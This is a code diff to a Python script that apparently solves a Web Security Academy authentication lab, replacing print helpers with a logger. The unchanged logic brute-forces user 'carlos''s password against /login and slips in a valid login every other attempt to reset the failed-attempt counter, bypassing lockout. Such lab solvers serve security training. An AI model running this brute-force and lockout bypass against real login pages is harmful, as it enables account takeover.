@@ -1,20 +1,15 @@
-from web_security_academy.core.utils import (
-    auth_lab_usernames,
-    auth_lab_passwords,
-    print_info,
-    print_info_secondary,
-    print_success,
-    print_fail,
-)
+from web_security_academy.core.logger import logger
+from web_security_academy.core.utils import auth_lab_passwords
 
 
 def solve_lab(session):
     passwords = auth_lab_passwords()
-    print_success("Success.\n")
+    logger.success("Success.")
 
     # Password enumeration
     user = "carlos"
-    print_info(f"Brute-forcing {user}'s password...")
+    logger.info(f"Brute-forcing {user}'s password...")
+    logger.toggle_newline()
     for i, password in enumerate(passwords):
         if i % 2 == 1:
             # Reset number of failed attempts with valid login
@@ -26,11 +21,14 @@ def solve_lab(session):
         resp = session.post_path("/login", data=data, allow_redirects=False)
 
         if resp.status_code != 302:
-            print_info_secondary(f"{password} => Incorrect", end="\x1b[1K")
+            logger.info(f"{password} => Incorrect")
         else:
-            print_success(f"{password} => Correct!\n")
+            logger.success(f"{password} => Correct!")
+            logger.toggle_newline()
             break
     else:
-        print_fail(f"Unable to brute-force {user}'s password.")
+        logger.failure(f"Unable to brute-force {user}'s password.")
+        logger.toggle_newline()
+        return
 
     session.login(user, password, with_csrf=False)
